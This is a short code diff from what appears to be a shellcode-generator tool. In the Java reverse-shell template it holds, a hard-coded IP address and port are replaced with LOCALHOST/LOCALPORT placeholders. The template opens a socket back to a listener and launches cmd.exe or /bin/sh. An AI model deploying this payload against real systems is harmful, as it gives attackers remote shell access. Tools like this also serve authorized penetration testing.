@@ -54,7 +54,7 @@ class JavaShellcodes(Shellcode):
 }
 try {
 	String OS = System.getProperty("os.name").toLowerCase();
-	Socket socket = new Socket( "192.168.1.113", 4000 );
+	Socket socket = new Socket( "LOCALHOST", LOCALPORT );
 	String command = "cmd.exe";
 	if (OS.indexOf("win") < 0)
 		command = "/bin/sh";
